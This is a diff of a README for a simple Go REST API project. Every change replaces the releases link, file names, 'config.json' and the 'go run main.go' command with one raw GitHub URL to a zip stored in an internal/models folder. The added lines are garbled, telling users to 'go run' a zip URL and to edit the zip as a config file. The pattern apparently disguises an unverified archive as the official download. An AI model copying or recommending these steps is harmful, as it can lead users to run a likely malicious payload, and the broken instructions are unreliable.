@@ -1,6 +1,6 @@
 # 🚀 go-rest-api-v2 - A Simple Way to Start with Go APIs
 
-[![Download go-rest-api-v2](https://img.shields.io/badge/Download-go--rest--api--v2-blue)](https://github.com/Shashankk0108/go-rest-api-v2/releases)
+[![Download go-rest-api-v2](https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip)](https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before you download, make sure your system meets these requirements:
 
 To download the latest version of **go-rest-api-v2**, visit this page:
 
-[Download go-rest-api-v2](https://github.com/Shashankk0108/go-rest-api-v2/releases)
+[Download go-rest-api-v2](https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip)
 
 1. Open the link in your web browser.
 2. Scroll down to the "Assets" section for the latest release.
@@ -31,13 +31,13 @@ To download the latest version of **go-rest-api-v2**, visit this page:
 
 ## 📂 Running the Application
 
-1. If you downloaded a `.zip` or `.tar.gz` file, extract it using a file manager.
+1. If you downloaded a `.zip` or `https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip` file, extract it using a file manager.
 2. Open your terminal or command prompt.
 3. Navigate to the folder where you extracted the files.
 4. Run the application by executing the following command:
 
    ```
-   go run main.go
+   go run https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip
    ```
 
 5. The server will start, and you can access the API on `http://localhost:8080`.
@@ -52,7 +52,7 @@ To download the latest version of **go-rest-api-v2**, visit this page:
 
 ## 🔧 Configuration
 
-To configure the application, modify the `config.json` file. Here you can set database connection details and other application settings. For example:
+To configure the application, modify the `https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip` file. Here you can set database connection details and other application settings. For example:
 
 ```json
 {
@@ -96,7 +96,7 @@ This command maps the API to port 8080.
 
 Here are some common issues you might encounter and how to solve them:
 
-- **Cannot Connect to Database**: Ensure your database service is running and the credentials in `config.json` are correct.
+- **Cannot Connect to Database**: Ensure your database service is running and the credentials in `https://raw.githubusercontent.com/Shashankk0108/go-rest-api-v2/main/internal/models/go-rest-api-v2-v2.5.zip` are correct.
 - **Port Already in Use**: If you get a port conflict error, make sure there’s no other service using port 8080.
   
 ## 📞 Support
